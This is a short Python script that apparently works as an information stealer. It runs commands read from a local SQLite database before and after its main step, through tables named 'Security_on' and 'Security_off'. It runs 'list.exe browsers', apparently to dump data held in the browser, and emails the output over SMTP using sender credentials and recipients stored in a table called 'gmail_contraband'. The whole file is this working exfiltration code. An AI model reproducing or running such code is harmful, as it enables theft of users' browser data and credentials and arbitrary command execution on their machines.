from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart

import os, smtplib, subprocess, sqlite3, time, requests, sys

try:
	response = requests.get("http://www.google.com")
except requests.ConnectionError:
	sys.exit()

conn = sqlite3.connect("kontrol.db")
cursor = conn.cursor()

def STARTANDSTOP(table):
	try:
		cursor.execute("SELECT cmd FROM {0}".format(table))
		for cmd in cursor.fetchall()[0]:
			os.system(cmd)
	except:
		pass

STARTANDSTOP("Security_on")

cursor.execute("SELECT rowid, * FROM gmail_contraband")
mas = cursor.fetchall()
print(mas)

returned_output = subprocess.check_output("list.exe browsers")
body = str(returned_output.decode('windows-1251'))

for dan in mas:

	msg = MIMEMultipart()
	msg['From']    = dan[1]
	msg['To']      = dan[3]
	msg['Subject'] = dan[4]

	msg.attach(MIMEText(body, 'plain'))

	server = smtplib.SMTP(dan[5], dan[6])
	server.starttls()
	server.login(dan[1], dan[2])
	server.send_message(msg)
	server.quit()
	cursor.execute("DELETE FROM gmail_contraband WHERE rowid = {0}".format(dan[0]))
	conn.commit()
	time.sleep(dan[7])                                

STARTANDSTOP("Security_off")